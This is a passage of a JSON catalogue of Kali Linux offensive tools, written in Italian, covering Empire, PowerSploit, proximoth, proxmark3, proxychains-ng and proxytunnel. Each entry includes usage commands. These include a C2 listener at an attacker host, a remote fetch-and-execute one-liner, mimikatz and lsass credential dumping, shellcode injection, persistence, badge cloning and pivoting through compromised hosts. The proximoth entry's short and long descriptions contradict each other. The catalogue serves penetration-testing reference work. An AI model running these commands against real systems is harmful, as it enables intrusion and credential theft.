(PowerUp, GPP, token impersonation). Ogni modulo è documentato con opzioni configurabili.</p><p><strong>Multi-Platform Agents:</strong> PowerShell agent per Windows con capacità native (accesso a .NET, WMI, registry), Python agent per Linux/macOS con moduli dedicati. IronPython agent per ambienti dove PowerShell è limitato. C# agent (Stager) per esecuzione .NET senza PowerShell.</p><p><strong>Listener Flexibility:</strong> HTTP/HTTPS listener con profili malleable C2 che imitano traffico di servizi legittimi (Google, Slack, Office365). Listener su porte custom, redirect tramite Apache/Nginx. Foreign listeners per integrazione con Metasploit o altri C2.</p><p><strong>Built-in Evasion:</strong> Obfuscation automatica degli stager tramite Invoke-Obfuscation integrato. Bypass AMSI incorporato negli agent. Script block logging evasion. Opzioni per custom encoding e delivery methods (HTA, macro, DLL, shellcode).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Empire utilizza architettura client-server. Il server gestisce listener e agent, il client (CLI o Starkiller GUI) interagisce.</p><pre><code># Avvio server Empire\nsudo powershell-empire server\n\n# Connessione client CLI\npowershell-empire client\n\n# Oppure usa Starkiller GUI (porta 1337 default)\n# https://localhost:1337\n\n# Setup listener HTTPS\n(Empire) > uselistener http\n(Empire: http) > set Host https://c2.attacker.com:443\n(Empire: http) > set CertPath /opt/empire/certs/\n(Empire: http) > set DefaultJitter 0.5\n(Empire: http) > execute\n\n# Genera stager PowerShell\n(Empire) > usestager windows/launcher_bat\n(Empire: launcher_bat) > set Listener http\n(Empire: launcher_bat) > set OutFile /tmp/launcher.bat\n(Empire: launcher_bat) > execute\n\n# Interazione con agent attivo\n(Empire) > agents\n(Empire) > interact AGENT_NAME\n(Empire: AGENT_NAME) > sysinfo\n(Empire: AGENT_NAME) > usemodule credentials/mimikatz/logonpasswords\n(Empire: AGENT_NAME) > execute\n\n# Lateral movement\n(Empire: AGENT_NAME) > usemodule lateral_movement/invoke_wmi\n(Empire: invoke_wmi) > set ComputerName DC01.corp.local\n(Empire: invoke_wmi) > set Listener http\n(Empire: invoke_wmi) > execute\n\n# Persistence\n(Empire: AGENT_NAME) > usemodule persistence/elevated/registry\n(Empire: registry) > execute</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Red Team Operations</strong>, Empire è il framework C2 di riferimento per operazioni su ambienti Windows Active Directory. La vasta libreria di moduli copre l'intera kill chain dal post-exploitation iniziale alla domain dominance. Il supporto multi-operatore permette operazioni di team coordinate.</p><p>Per <strong>Adversary Emulation</strong>, i moduli Empire mappano direttamente alle tecniche MITRE ATT&CK. È possibile replicare le TTP di APT specifici per validare le difese. BC Security mantiene playbook di emulazione per threat actor noti.</p><p>Per <strong>Purple Team Exercises</strong>, Empire genera telemetria ricca che il blue team può utilizzare per sviluppare e testare detection rules. Ogni modulo produce artefatti specifici (eventi Windows, network traffic, file system changes) identificabili.</p><p>Per <strong>Security Training</strong>, ambiente strutturato per apprendere tecniche post-exploitation in contesto controllato. L'interfaccia Starkiller rende accessibile anche a chi non ha esperienza CLI.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>High Detection Rate:</strong> Empire è uno dei C2 più noti e tutti i principali EDR hanno signature dedicate per stager, agent, e moduli. Le versioni stock sono rilevate immediatamente. Necessaria customizzazione significativa per ambienti protetti.</p><p><strong>PowerShell Monitoring:</strong> Ambienti maturi monitorano PowerShell con ScriptBlock Logging (4104), Module Logging (4103), e Transcription. Tutti i comandi Empire appaiono nei log. Constrained Language Mode blocca molti moduli.</p><p><strong>Network Signatures:</strong> I profili C2 default hanno signature note in Snort/Suricata. Usare profili malleable personalizzati e domain fronting per ridurre detectability del traffico di rete.</p><p><strong>Infrastructure Hardening:</strong> Il server Empire contiene tutte le credenziali raccolte e la cronologia comandi. Compromissione del server espone l'intera operazione. Usare redirector, VPN, e segregazione.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "04_Red_Team",
      "C2_Frameworks"
    ],
    "notes": null
  },
  {
    "id": "powersploit",
    "name": "powersploit",
    "version": "3.0.0",
    "icon": "../app/icons/powersploit-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/powersploit/",
    "desc": "Moduli PowerShell per code execution, persistence, bypass, exfiltration ed escalation.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerSploit</strong> è la collezione di moduli PowerShell per penetration testing più influente mai creata, sviluppata da PowerShellMafia (Matt Graeber, Joseph Bialek, et al.). Organizzata in sei categorie funzionali — CodeExecution, ScriptModification, Persistence, AntivirusBypass, Exfiltration, e Recon/PrivEsc — fornisce un toolkit completo per ogni fase della post-exploitation su sistemi Windows. Sebbene il progetto sia ufficialmente archiviato (ultimo commit 2020), i suoi moduli rimangono ampiamente utilizzati e molti tool moderni (Empire, Covenant) li integrano. Il modulo <strong>PowerUp</strong> per privilege escalation e <strong>Invoke-Mimikatz</strong> per credential dumping sono diventati standard de facto nel penetration testing.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>CodeExecution:</strong> Invoke-Shellcode inietta shellcode in processi arbitrari (process injection). Invoke-DllInjection carica DLL in processi remoti. Invoke-ReflectivePEInjection esegue PE (exe/dll) interamente in memoria senza toccare disco, la tecnica più stealth per esecuzione payload.</p><p><strong>PowerUp (Privilege Escalation):</strong> Invoke-AllChecks esegue audit completo del sistema cercando: servizi con path unquoted, DLL hijacking, permessi weak su servizi, AlwaysInstallElevated, autologon credentials, scheduled task modificabili, e decine di altri vettori. Per ogni vulnerabilità trovata, fornisce il comando di exploitation.</p><p><strong>Persistence:</strong> Moduli per installare backdoor persistenti via registry run keys, scheduled tasks, WMI event subscriptions, security support providers (SSP), e AppInit DLLs. Ogni metodo ha diversi livelli di stealth e requisiti di privilegio.</p><p><strong>Exfiltration:</strong> Out-Minidump crea dump di processi (utile per estrarre credenziali da lsass.exe). Invoke-NinjaCopy legge file bloccati dal sistema (SAM, SYSTEM, NTDS.dit) bypassing lock via raw disk access. Get-GPPPassword estrae password da Group Policy Preferences.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>I moduli PowerSploit possono essere importati singolarmente o come suite completa.</p><pre><code># Import dell'intera suite\nImport-Module PowerSploit\n\n# Import singolo modulo in memoria (fileless)\nIEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/PowerUp.ps1')\n\n# === PRIVILEGE ESCALATION ===\n# Audit completo per vettori di escalation\nInvoke-AllChecks\n\n# Sfrutta servizio con permessi deboli\nInvoke-ServiceAbuse -Name 'VulnService' -UserName 'corp\\attacker'\n\n# Sfrutta unquoted service path\nWrite-ServiceBinary -Name 'VulnSvc' -Path 'C:\\Program Files\\Vuln\\'\n\n# === CREDENTIAL ACCESS ===\n# Mimikatz in-memory (dump credenziali)\nInvoke-Mimikatz -DumpCreds\n\n# Dump processo lsass\nOut-Minidump -Process (Get-Process lsass) -DumpFilePath C:\\temp\\\n\n# Copia SAM/SYSTEM (file bloccati)\nInvoke-NinjaCopy -Path 'C:\\Windows\\System32\\config\\SAM' -LocalDestination 'C:\\temp\\SAM'\n\n# Estrai password da GPP\nGet-GPPPassword\n\n# === CODE EXECUTION ===\n# Shellcode injection in processo\nInvoke-Shellcode -ProcessId 1234 -Shellcode $buf\n\n# Reflective PE injection (exe in memoria)\nInvoke-ReflectivePEInjection -PEBytes $bytes -ProcId $pid\n\n# === PERSISTENCE ===\n# Registry run key\nNew-UserPersistenceOption -Registry -AtLogon\n\n# WMI event subscription\nAdd-Persistence -ScriptBlock $payload -EventSub</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Privilege Escalation Assessment</strong>, PowerUp è il tool di riferimento per identificare misconfigurazioni di privilegio su Windows. Invoke-AllChecks produce un report completo di ogni potenziale vettore di escalation, con exploitation automatica opzionale per ciascuno.</p><p>Per <strong>Credential Harvesting</strong>, Invoke-Mimikatz e i moduli di exfiltration permettono di estrarre credenziali da memoria, SAM, LSA secrets, e Group Policy senza installare software aggiuntivo. Tutto avviene in memoria PowerShell.</p><p>Per <strong>Red Team Payload Execution</strong>, Invoke-ReflectivePEInjection permette di caricare ed eseguire payload complessi (Cobalt Strike beacon, custom implant) interamente in memoria, senza mai scrivere file su disco.</p><p>Per <strong>Security Audit</strong>, PowerUp identifica vulnerabilità di configurazione che script di hardening dovrebbero correggere. Utile per validare che le policy di sicurezza siano effettivamente implementate.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Extremely High Detection:</strong> PowerSploit è nel database di signature di ogni antivirus e EDR. I nomi delle funzioni (Invoke-Mimikatz, Invoke-Shellcode) sono trigger immediati per AMSI. Richiede obfuscation significativa o riscrittura per uso in ambienti protetti.</p><p><strong>AMSI Blocking:</strong> Da Windows 10, AMSI intercetta il codice PowerShell prima dell'esecuzione. I moduli PowerSploit stock vengono bloccati immediatamente. Necessario bypass AMSI (che a sua volta è monitorato) prima dell'import.</p><p><strong>Complete Logging:</strong> PowerShell ScriptBlock Logging (4104) registra l'intero contenuto di ogni script eseguito. Module Logging (4103) traccia ogni cmdlet. Transcription salva tutto su file. L'intera catena di azioni è ricostruibile dal blue team.</p><p><strong>Progetto Archiviato:</strong> L'ultimo update risale al 2020. Alcune tecniche sono obsolete su Windows 11/Server 2022. Alternative moderne (SharpCollection, BOF) offrono evasione migliore. Tuttavia, i concetti e le tecniche restano fondamentali.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "notes": null
  },
  {
    "id": "proximoth",
    "name": "proximoth",
    "version": "1.0.0",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proximoth/",
    "desc": "Exploita vulnerabilità F2FS control frame per attacchi su filesystem moderni.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proximoth</strong> è un tool di security research per l'analisi e l'exploitation di vulnerabilità nel protocollo Wi-Fi, specificamente focalizzato su frame 802.11 di controllo e management. Il nome deriva da \"proximity\" + \"moth\" (attratto dalla luce/segnale). Proximoth opera a livello di frame raw 802.11, permettendo di manipolare, iniettare e analizzare frame di controllo Wi-Fi come probe request/response, beacon frame, authentication e deauthentication frame. A differenza di tool generici come aireplay-ng che si concentrano su attacchi noti, Proximoth è progettato per ricerca su vulnerabilità nuove nei protocolli wireless, fornendo granularità completa nella costruzione e manipolazione dei frame.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Raw Frame Injection:</strong> Costruisce e inietta frame 802.11 arbitrari a livello MAC. Controllo completo su ogni campo dell'header: type, subtype, flags, duration, indirizzi MAC, sequence number, e payload. Permette di testare come access point e client reagiscono a frame malformati o inaspettati.</p><p><strong>Control Frame Analysis:</strong> Cattura e decodifica frame di controllo Wi-Fi in tempo reale. Analizza RTS/CTS, ACK, Block ACK, PS-Poll, CF-End e altri frame normalmente ignorati dagli sniffer standard. Utile per identificare anomalie nel protocollo.</p><p><strong>Protocol Fuzzing:</strong> Genera varianti di frame con campi modificati sistematicamente per identificare crash o comportamenti anomali nei driver wireless e firmware degli access point. Può iterare su range di valori per fuzzing mirato di campi specifici.</p><p><strong>Vulnerability Testing:</strong> Include proof-of-concept per vulnerabilità note in implementazioni 802.11 specifiche. Permette di verificare se un AP o client è vulnerabile a attacchi basati su frame malformati.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Proximoth richiede una scheda wireless in monitor mode che supporti injection.</p><pre><code># Prerequisito: interfaccia in monitor mode\nsudo airmon-ng start wlan0\n\n# Scansione e cattura frame di controllo\nproximoth -i wlan0mon --scan\n\n# Injection di deauthentication frame custom\nproximoth -i wlan0mon --inject --type deauth \\\n  --bssid AA:BB:CC:DD:EE:FF --client 11:22:33:44:55:66\n\n# Fuzzing frame di management su AP specifico\nproximoth -i wlan0mon --fuzz --target AA:BB:CC:DD:EE:FF \\\n  --frame-type beacon --field capabilities\n\n# Analisi frame raw con filtro per tipo\nproximoth -i wlan0mon --capture --filter control \\\n  --output capture.pcap\n\n# Test vulnerabilità specifica\nproximoth -i wlan0mon --exploit cve-2020-XXXX \\\n  --target AA:BB:CC:DD:EE:FF\n\n# Generazione frame custom da template\nproximoth -i wlan0mon --craft --template probe_request \\\n  --ssid \"TestNetwork\" --src-mac 00:11:22:33:44:55</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Wireless Security Research</strong>, proximoth fornisce il controllo granulare necessario per studiare come dispositivi e access point gestiscono frame anomali o malformati. Utile per scoprire nuove vulnerabilità nei driver wireless e firmware.</p><p>Per <strong>Penetration Testing Wireless</strong>, test di robustezza delle infrastrutture Wi-Fi aziendali contro attacchi a livello di frame. Verifica che AP e client gestiscano correttamente frame malformati senza crash o behavior anomalo.</p><p>Per <strong>Driver/Firmware Testing</strong>, fuzzing sistematico di implementazioni 802.11 per identificare bug di parsing, buffer overflow, o denial of service nei driver wireless di specifici vendor.</p><p>Per <strong>IDS/WIDS Validation</strong>, genera frame di attacco per testare che sistemi di wireless intrusion detection identifichino correttamente attività malevola a livello di protocollo.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Rilevabilità:</strong> Frame injection è rilevabile da qualsiasi WIDS (Wireless Intrusion Detection System) nella zona. I frame iniettati hanno caratteristiche distinguibili dal traffico legittimo.</p><p><strong>Impatto DoS:</strong> Alcuni tipi di frame injection (deauth, disassociation) causano disconnessione di client. Il fuzzing può crashare access point, causando outage del servizio Wi-Fi.</p><p><strong>Legalità:</strong> L'injection di frame wireless è regolamentata. In molte giurisdizioni, interferire con comunicazioni wireless è illegale senza autorizzazione esplicita. Usare solo in ambienti di test controllati.</p><p><strong>Hardware Requirements:</strong> Richiede schede wireless con chipset che supportano injection in monitor mode (Atheros, Ralink, Realtek specifici). Non tutte le schede wireless funzionano.</p><br><hr>",
    "best_in": false,
    "category_path": [
      "02_Exploitation",
      "General"
    ],
    "notes": null
  },
  {
    "id": "proxmark3",
    "name": "proxmark3",
    "version": "4.18994",
    "icon": "../app/icons/kali-tools-icon-missing.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxmark3/",
    "desc": "Toolkit RFID/NFC completo: clonazione badge, sniffing, cracking Mifare e HID iClass.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxmark3</strong> è la piattaforma hardware/software più avanzata e versatile per RFID e NFC security research. Il dispositivo opera su due frequenze — 125 kHz (Low Frequency, LF) e 13.56 MHz (High Frequency, HF) — coprendo praticamente tutti gli standard di card contactless: Mifare Classic/Ultralight/DESFire, HID Prox/iClass, EM4100/4305, T5577, NTAG, ISO 14443/15693, e molti altri. Il software client (pm3) fornisce centinaia di comandi per lettura, scrittura, clonazione, sniffing, cracking chiavi, e simulazione di card. Il Proxmark3 può operare sia come reader (interroga card) che come card emulator (risponde ai reader), rendendolo lo strumento definitivo per physical security assessment e RFID/NFC research.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Mifare Classic Cracking:</strong> Implementa tutti gli attacchi noti contro Mifare Classic: darkside attack (recupera prima chiave senza conoscerne nessuna), nested attack (usa una chiave nota per derivare le altre), hardnested attack (per varianti con random number generator patchato). autopwn combina automaticamente tutti gli attacchi per dump completo della card.</p><p><strong>HID/iClass Cloning:</strong> Legge e clona badge HID ProxCard II (125kHz), iClass (13.56MHz), e SEOS. Per card legacy senza crittografia, la clonazione è immediata. Per iClass con chiavi custom, supporta attacchi brute force e dictionary con chiavi note.</p><p><strong>Sniffing & Replay:</strong> Cattura la comunicazione bidirezionale tra reader e card in tempo reale. I dati catturati possono essere analizzati per estrarre chiavi, protocolli custom, o essere replayed contro reader o card per attacchi relay.</p><p><strong>Card Emulation:</strong> Il Proxmark3 può emulare una card, rispondendo ai reader come se fosse il badge originale. Utile per testare sistemi di controllo accessi senza modificare card originali, e per attacchi man-in-the-middle tra reader e card.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Il Proxmark3 si connette via USB e si controlla tramite il client <code>pm3</code> (o <code>proxmark3</code>).</p><pre><code># Connessione al dispositivo\npm3\n\n# Auto-detect: identifica tipo di card sconosciuta\npm3 --> auto\n\n# === MIFARE CLASSIC ===\n# Autopwn: cracking automatico tutte le chiavi + dump\npm3 --> hf mf autopwn\n\n# Lettura singolo blocco con chiave nota\npm3 --> hf mf rdbl --blk 0 -k FFFFFFFFFFFF\n\n# Dump completo card su file\npm3 --> hf mf dump\n\n# Scrivi dump su card vergine (clone)\npm3 --> hf mf restore\n\n# === HID PROX (125kHz) ===\n# Lettura badge HID\npm3 --> lf hid reader\n\n# Clonazione su T5577 (card riscrivibile)\npm3 --> lf hid clone --raw 200670012F\n\n# Brute force facility code\npm3 --> lf hid brute --fc 42 --cn 1 --endcn 10000\n\n# === SNIFFING ===\n# Sniff comunicazione HF (13.56MHz)\npm3 --> hf sniff\n\n# Sniff comunicazione LF (125kHz)\npm3 --> lf sniff\n\n# === EMULAZIONE ===\n# Emula Mifare Classic con dump caricato\npm3 --> hf mf sim --1k\n\n# Emula badge HID\npm3 --> lf hid sim --raw 200670012F\n\n# === iCLASS ===\n# Lettura iClass\npm3 --> hf iclass reader\n\n# Dump con chiave standard\npm3 --> hf iclass dump --ki 0</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Physical Penetration Testing</strong>, il Proxmark3 è essenziale per testare sistemi di controllo accessi basati su RFID/NFC. Clonazione di badge employee permette di validare se il sistema è vulnerabile a duplicazione. Molte aziende usano ancora Mifare Classic o HID Prox legacy, entrambi facilmente clonabili.</p><p>Per <strong>Access Control Audit</strong>, verifica che il sistema RFID aziendale utilizzi standard crittografici adeguati. Mifare Classic con chiavi default, HID Prox senza crittografia, e iClass con chiavi standard sono tutti vulnerabili e dovrebbero essere migrati a tecnologie più sicure (DESFire, SEOS).</p><p>Per <strong>RFID/NFC Research</strong>, analisi di protocolli proprietari, reverse engineering di card custom, studio di vulnerabilità in nuove implementazioni. Il Proxmark3 è lo strumento di riferimento per la comunità di ricerca RFID.</p><p>Per <strong>Incident Response</strong>, in caso di sospetta clonazione badge, il Proxmark3 può verificare l'autenticità delle card e analizzare i log di accesso per identificare badge duplicati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Legalità:</strong> La clonazione di badge di accesso senza autorizzazione esplicita è un reato in molte giurisdizioni. Anche in contesti di pentest autorizzato, la clonazione deve essere specificamente inclusa nello scope dell'engagement.</p><p><strong>Prossimità Fisica:</strong> La lettura di card richiede vicinanza fisica (1-5 cm per HF, fino a 20 cm per LF con antenne amplificate). Social engineering potrebbe essere necessario per avvicinare il dispositivo ai badge target.</p><p><strong>Hardware Necessario:</strong> Richiede dispositivo Proxmark3 (Easy, RDV4, o compatibile). Il RDV4 è la versione più avanzata con batteria interna, Bluetooth, e antenna ottimizzata per operazioni sul campo.</p><p><strong>Counter-Measures:</strong> Sistemi moderni con mutual authentication, rolling codes, e secure element (DESFire EV2/3, SEOS) resistono agli attacchi di clonazione. Verificare le specifiche del sistema target prima dell'engagement.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "02_Exploitation",
      "Wireless",
      "RFID_NFC"
    ],
    "notes": null
  },
  {
    "id": "proxychains-ng",
    "name": "proxychains-ng",
    "version": "4.17",
    "icon": "../app/icons/proxychains-ng-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxychains-ng/",
    "desc": "Forza qualsiasi tool TCP attraverso proxy SOCKS/HTTP per pivoting e anonimizzazione.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxychains-ng</strong> è un tool che forza qualsiasi applicazione TCP a instradare il traffico attraverso uno o più proxy (SOCKS4, SOCKS5, HTTP CONNECT) senza alcuna modifica al codice dell'applicazione. Funziona tramite <strong>LD_PRELOAD</strong> hooking: intercetta le chiamate di sistema di rete (connect, gethostbyname) e le redirige attraverso la catena proxy configurata. Questo è fondamentale in due scenari: <strong>pivoting</strong> durante penetration test (instradare tool attraverso un tunnel SOCKS creato su host compromesso per raggiungere reti interne) e <strong>anonimizzazione</strong> (instradare traffico attraverso Tor o catene di proxy). La versione \"ng\" (next generation) è la riscrittura moderna che risolve problemi della versione originale, con supporto migliorato per SOCKS5 e DNS proxying.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Chain Types:</strong> Tre modalità di concatenamento proxy: <strong>dynamic</strong> (salta proxy non disponibili, continua con i successivi), <strong>strict</strong> (tutti i proxy nella catena devono funzionare, fallisce se uno è down), <strong>random</strong> (sceglie proxy casuali dalla lista per ogni connessione, massima anonimizzazione).</p><p><strong>Transparent Proxying:</strong> Hook delle syscall di rete via LD_PRELOAD. L'applicazione non sa di essere proxata: crede di connettersi direttamente al target. Funziona con qualsiasi applicazione che usa libc per networking (la maggior parte dei tool Linux).</p><p><strong>DNS Resolution Control:</strong> Opzione <code>proxy_dns</code> forza la risoluzione DNS attraverso il proxy, prevenendo DNS leak che rivelerebbero i target reali. Supporta anche <code>proxy_dns_old</code> per compatibilità con proxy legacy.</p><p><strong>Multi-Protocol Support:</strong> Miscela proxy di diversi tipi nella stessa catena: SOCKS4 per proxy legacy, SOCKS5 per autenticazione e UDP (parziale), HTTP CONNECT per proxy web. Ogni entry nella catena può essere di tipo diverso.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Configurazione in <code>/etc/proxychains4.conf</code> o <code>~/.proxychains/proxychains.conf</code>.</p><pre><code># Configurazione base (/etc/proxychains4.conf)\n# dynamic_chain  (o strict_chain, random_chain)\n# proxy_dns\n# [ProxyList]\n# socks5 127.0.0.1 1080\n# socks4 proxy2.example.com 9050\n\n# === PIVOTING (scenario più comune) ===\n# 1. Crea tunnel SOCKS su host compromesso\nssh -D 1080 -N user@compromised_host\n\n# 2. Configura proxychains:\n# socks5 127.0.0.1 1080\n\n# 3. Usa tool attraverso il tunnel\nproxychains4 nmap -sT -Pn 192.168.1.0/24\nproxychains4 crackmapexec smb 192.168.1.0/24\nproxychains4 ssh admin@192.168.1.100\n\n# === ANONIMIZZAZIONE VIA TOR ===\n# Tor ascolta su SOCKS5 127.0.0.1:9050\nproxychains4 curl https://check.torproject.org\nproxychains4 firefox &amp;\n\n# === CATENA MULTI-HOP ===\n# Configura catena: attacker → proxy1 → proxy2 → target\n# socks5 proxy1.com 1080\n# socks5 proxy2.com 1080\nproxychains4 nmap -sT target.internal\n\n# === CON CHISEL (alternativa a SSH) ===\n# Server chisel su host compromesso\n./chisel server --socks5 --port 8888\n# Client locale\nchisel client compromised:8888 socks\n# Configura: socks5 127.0.0.1 1080\nproxychains4 evil-winrm -i dc01.corp.local -u admin -p pass\n\n# === METASPLOIT PIVOTING ===\n# In msfconsole con sessione meterpreter:\n# route add 192.168.1.0/24 session_id\n# use auxiliary/server/socks_proxy\n# Poi: proxychains4 nmap -sT 192.168.1.0/24</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Network Pivoting</strong>, proxychains è il modo standard per instradare tool di attacco attraverso tunnel SOCKS creati su host compromessi. Dopo aver ottenuto accesso a un sistema nella DMZ, un tunnel SSH/chisel + proxychains permette di usare nmap, crackmapexec, e altri tool sulla rete interna come se si fosse direttamente connessi.</p><p>Per <strong>Anonimizzazione</strong>, instradare traffico attraverso Tor o catene di proxy per nascondere l'IP sorgente. Utile per reconnaissance OSINT dove non si vuole rivelare l'interesse verso un target specifico.</p><p>Per <strong>Firewall Bypass</strong>, in ambienti dove solo traffico HTTP/HTTPS è permesso, un proxy SOCKS su porta 443 permette di tunnelizzare qualsiasi protocollo TCP attraverso il firewall via proxychains.</p><p>Per <strong>Multi-Network Access</strong>, catene di proxy attraverso più reti segmentate. Ogni hop attraversa un confine di rete, permettendo di raggiungere segmenti altrimenti isolati.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Solo TCP:</strong> Proxychains funziona solo con TCP. ICMP (ping), UDP (DNS standard, SNMP), e protocolli raw non vengono proxati. Nmap deve usare <code>-sT</code> (TCP connect) e <code>-Pn</code> (no ping) quando proxato.</p><p><strong>DNS Leak:</strong> Senza <code>proxy_dns</code>, le risoluzioni DNS bypassano il proxy e vengono inviate direttamente, rivelando i target. Sempre abilitare proxy_dns in operazioni sensibili.</p><p><strong>Performance Degradation:</strong> Ogni hop aggiunge latenza. Catene lunghe rendono scan e tool interattivi molto lenti. Timeout di tool come nmap devono essere aumentati per compensare.</p><p><strong>LD_PRELOAD Limitations:</strong> Applicazioni compilate staticamente o che usano syscall dirette (non libc) bypassano l'hook di proxychains. Verificare che il tool usato funzioni effettivamente attraverso il proxy.</p><br><hr>",
    "best_in": true,
    "category_path": [
      "03_Post_Exploitation",
      "Pivoting"
    ],
    "notes": null
  },
  {
    "id": "proxytunnel",
    "name": "proxytunnel",
    "version": "1.12.3",
    "icon": "../app/icons/proxytunnel-logo.svg",
    "installation": "Kali Linux",
    "repo": "https://www.kali.org/tools/proxytunnel/",
    "desc": "Tunneling SSH attraverso proxy HTTP CONNECT per bypass firewall aziendali.",
    "desc_long": "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Proxytunnel</strong> è un tool specializzato nella creazione di tunnel TCP attraverso proxy HTTP/HTTPS che supportano il metodo CONNECT (RFC 7231). Il suo uso principale è permettere connessioni SSH (o qualsiasi protocollo TCP) attraverso proxy aziendali che normalmente consentono solo traffico HTTP/HTTPS. Il metodo HTTP CONNECT è una funzionalità legittima dei proxy usata per stabilire tunnel SSL: il client chiede al proxy di creare una connessione TCP raw verso un host:porta arbitrario, e il proxy inoltra i byte bidirezionalmente. Proxytunnel sfrutta questa funzionalità per incapsulare protocolli non-HTTP all'interno di connessioni CONNECT. Supporta catene di proxy (proxy1 → proxy2 → destinazione), autenticazione NTLM/Basic, e connessioni SSL al proxy stesso.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>HTTP CONNECT Tunneling:</strong> Stabilisce connessioni TCP arbitrarie attraverso proxy HTTP usando il metodo CONNECT. Il proxy vede solo l'hostname e la porta di destinazione, non il contenuto del tunnel. Una volta stabilito, il tunnel è trasparente: SSH, VPN, o qualsiasi protocollo TCP funziona normalmente.</p><p><strong>Proxy Chaining:</strong> Supporta catene di proxy: il primo proxy CONNECT al secondo, che CONNECT alla destinazione finale. Utile in ambienti con proxy multi-tier (es. proxy locale → proxy DMZ → internet).</p><p><strong>Authentication Support:</strong> Supporta autenticazione Basic e NTLM al proxy. NTLM è essenziale in ambienti Windows Active Directory dove il proxy richiede autenticazione di dominio. Le credenziali possono essere passate via CLI o variabili d'ambiente.</p><p><strong>SSH ProxyCommand Integration:</strong> Progettato per essere usato come <code>ProxyCommand</code> nella configurazione SSH. Questo rende il tunneling completamente trasparente: il comando <code>ssh</code> usa proxytunnel automaticamente senza intervento manuale.</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p>Proxytunnel si usa tipicamente come ProxyCommand per SSH, ma può tunnel qualsiasi protocollo TCP.</p><pre><code># Tunnel SSH attraverso proxy aziendale\nproxytunnel -p proxy.corp.com:8080 -d ssh.myserver.com:22 \\\n  -a 5555 -v\n# Poi: ssh -p 5555 user@localhost\n\n# Come ProxyCommand SSH diretto\nssh -o 'ProxyCommand proxytunnel -p proxy.corp.com:8080 -d %h:%p' \\\n  user@ssh.myserver.com\n\n# Configurazione permanente in ~/.ssh/config\n# Host myserver\n#   HostName ssh.myserver.com\n#   User myuser\n#   ProxyCommand proxytunnel -p proxy.corp.com:8080 -d %h:%p\n#   ServerAliveInterval 60\n\n# Con autenticazione proxy NTLM\nproxytunnel -p proxy:8080 -d target:22 \\\n  -P domain\\\\username:password\n\n# Con autenticazione Basic\nproxytunnel -p proxy:8080 -d target:22 -F user:pass\n\n# Catena di proxy (dual-hop)\nproxytunnel -p proxy1:8080 -r proxy2:3128 -d target:22\n\n# Proxy SSL (HTTPS proxy)\nproxytunnel -E -p proxy.corp.com:443 -d ssh.external.com:22\n\n# Con header custom per bypass inspection\nproxytunnel -p proxy:8080 -d target:443 \\\n  -H 'User-Agent: Mozilla/5.0'\n\n# Tunnel per VPN (OpenVPN su TCP)\nproxytunnel -p proxy:8080 -d vpn.server.com:443 -a 1194\n# Poi: openvpn --remote localhost 1194 --proto tcp</code></pre><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p>Per <strong>Firewall Bypass</strong>, in reti aziendali dove solo traffico HTTP/HTTPS è permesso, proxytunnel stabilisce connessioni SSH outbound attraverso il proxy consentito. Questo è legittimo per sviluppatori che necessitano accesso SSH, ma anche sfruttabile per exfiltration.</p><p>Per <strong>C2 Communication</strong>, in scenari di red team, proxytunnel può incapsulare comunicazioni C2 attraverso proxy aziendali. Il traffico appare come una connessione HTTPS legittima al proxy.</p><p>Per <strong>Remote Administration</strong>, accesso SSH a server esterni da reti corporate restrittive. La configurazione in SSH config rende l'uso trasparente e permanente.</p><p>Per <strong>VPN over HTTP</strong>, incapsula connessioni OpenVPN TCP o WireGuard attraverso proxy HTTP, permettendo VPN in ambienti dove normalmente sarebbe bloccato.</p><br><hr><h4 class=\"rt-red\">Considerazioni OPSEC</h4><p><strong>Proxy Logging:</strong> I proxy aziendali loggano tutte le richieste CONNECT con hostname e porta destinazione. Connessioni CONNECT verso porte non standard (22, 1194) sono anomale e possono generare alert.</p><p><strong>DLP/Inspection:</strong> Proxy avanzati con SSL inspection possono terminare e re-cifrare connessioni SSL, esponendo il contenuto del tunnel. Se SSH handshake viene rilevato dentro una connessione CONNECT, il proxy può bloccarla.</p><p><strong>Port Restriction:</strong> Molti proxy permettono 